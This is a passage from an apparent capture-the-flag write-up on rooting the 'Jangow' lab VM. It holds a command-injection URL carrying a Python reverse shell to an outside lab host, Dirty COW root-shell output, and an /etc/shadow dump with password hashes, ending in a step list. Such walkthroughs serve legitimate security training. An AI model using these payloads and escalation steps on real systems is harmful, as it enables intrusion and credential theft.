+[*] patched (procselfmemThread)
+[*] patched (madviseThread)
+root@jangow01:/tmp# whoami
+whoami
+root
+root@jangow01:/tmp# i[*] exploiting (unpatch)
+d
+id
+uid=0(root) gid=0(root) grupos=0(root)
+root@jangow01:/tmp# [*] unpatched: uid=1000 (procselfmemThread)
+[*] unpatched: uid=1000 (madviseThread)
+
+
+root@jangow01:/tmp# id
+id
+uid=0(root) gid=0(root) grupos=0(root)
+root@jangow01:/tmp#
+
+root@jangow01:/tmp# hostname
+hostname
+jangow01
+root@jangow01:/tmp#
+
+root@jangow01:/tmp# date
+date
+Dom Dez 19 15:19:28 BRST 2021
+root@jangow01:/tmp# cd /root
+cd /root
+root@jangow01:~# ls -la
+
+
+/&#39;
+^C
+</code></pre>
+<p>URL for reverse shell: <code>http://192.168.56.118/site/busque.php?buscar=python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.70%22,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27</code></p>
+<figure>
+    <img src="35.continuing-exploitation.png" alt="" /><figcaption>35.continuing-exploitation</figcaption>
+</figure>
+<figure>
+    <img src="36.compiling-and-putting-binary-on-tmp.png" alt="" /><figcaption>36.compiling-and-putting-binary-on-tmp</figcaption>
+</figure>
+<figure>
+    <img src="37.rooted-but-crashed.png" alt="" /><figcaption>37.rooted-but-crashed</figcaption>
+</figure>
+<h2 id="rooted">Rooted</h2>
+<pre class="shell"><code>root@jangow01:/# cd /root
+cd /root
+root@jangow01:~# dir
+dir
+proof.txt
+root@jangow01:~# ls -la
+ls -la
+total 36
+drwx------  4 root root 4096 Out 31 19:16 .
+drwxr-xr-x 24 root root 4096 Jun 10  2021 ..
+-rw-------  1 root root 3958 Nov  3 13:51 .bash_history
+-rw-r--r--  1 root root 3106 Out 22  2015 .bashrc
+drwx------  2 root root 4096 Out 31 18:50 .cache
+drwxr-xr-x  2 root root 4096 Jun 10  2021 .nano
+-rw-r--r--  1 root root  148 Ago 17  2015 .profile
+-rw-r--r--  1 root root 2439 Out 31 19:16 proof.txt
+-rw-r--r--  1 root root  211 Jun 10  2021 .wget-hsts
+root@jangow01:~# cat proof.txt
+cat proof.txt
+                       @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
+                       @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    /&amp;@@@@@@@@@@
+                       @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((//#&amp;@@@&amp;   .&amp;@@@@@
+                       @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   ./@@*   &amp;@@
+                       @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;
+                       @  @@@, /@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;
+                       @  @&amp;  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&amp;
+                       @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@
+                       @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @
+                       @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@
+                      @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@
+                      @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@
+                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@
+                       @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@
+                       @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@
+                       @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &amp;@
+                       @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@
+                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;
+                       @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &amp;@@&amp;&amp;
+                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#/.      &amp;@@@@&amp;&amp;
+                       @  @@@@@@@@&amp;               JANGOW               &amp;@@@
+                       @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;
+                                     &amp;&amp;&amp;@@@@&amp;%       &amp;/    (&amp;&amp;@@@&amp;&amp;&amp;
+                                       (((((((((((((((((((((((((((((
+
+
+
+
+
+da39a3ee5e6b4b0d3255bfef95601890afd80709
+root@jangow01:~# cat /etc/system
+cat /etc/system
+cat: /etc/system: Arquivo ou diretório não encontrado
+root@jangow01:~# cat /etc/shadow
+cat /etc/shadow
+root:$6$PXrwbBNh$ny.JBjNHDzDnp9r74A5IgGGDhAg4GuJCH2CppO3CkVj0eeQefEVUD.L9j.KlQisKloO9ne454GyJTQHdlCaYf1:18931:0:99999:7:::
+daemon:*:17001:0:99999:7:::
+bin:*:17001:0:99999:7:::
+sys:*:17001:0:99999:7:::
+sync:*:17001:0:99999:7:::
+games:*:17001:0:99999:7:::
+man:*:17001:0:99999:7:::
+lp:*:17001:0:99999:7:::
+mail:*:17001:0:99999:7:::
+news:*:17001:0:99999:7:::
+uucp:*:17001:0:99999:7:::
+proxy:*:17001:0:99999:7:::
+www-data:*:17001:0:99999:7:::
+backup:*:17001:0:99999:7:::
+list:*:17001:0:99999:7:::
+irc:*:17001:0:99999:7:::
+gnats:*:17001:0:99999:7:::
+nobody:*:17001:0:99999:7:::
+systemd-timesync:*:17001:0:99999:7:::
+systemd-network:*:17001:0:99999:7:::
+systemd-resolve:*:17001:0:99999:7:::
+systemd-bus-proxy:*:17001:0:99999:7:::
+syslog:*:17001:0:99999:7:::
+_apt:*:17001:0:99999:7:::
+lxd:*:18788:0:99999:7:::
+messagebus:*:18788:0:99999:7:::
+uuidd:*:18788:0:99999:7:::
+dnsmasq:*:18788:0:99999:7:::
+jangow01:$6$cqyJEdd6$8N6lGnBYPCnkIf8kTW2FdtTo5fiIqRqlI1fqIuzYtEDwz0.PPlOyzwnCkIpfGSMz4NDZI93vBiCSdSRk3s3Tp/:18788:0:99999:7:::
+sshd:*:18788:0:99999:7:::
+ftp:*:18788:0:99999:7:::
+mysql:!:18788:0:99999:7:::</code></pre>
+<figure>
+    <img src="38.rooted.png" alt="" /><figcaption>38.rooted</figcaption>
+</figure>
+<p>Rooted.</p>
+<h2 id="how-to-root">How to root</h2>
+<ol type="1">
+    <li>Find <code>http://192.168.56.118/site/busque.php?buscar=</code> and seet that it can execute commands</li>
+    <li>Find python no space reverse shell and catch a shell</li>
+    <li>Find backup files and find passwords</li>
+    <li>Find users</li>
+    <li>Find dirtycow-mem.c</li>
+    <li>Put the file up in /tmp via FTP</li>
+    <li>execute and be root</li>
+</ol>
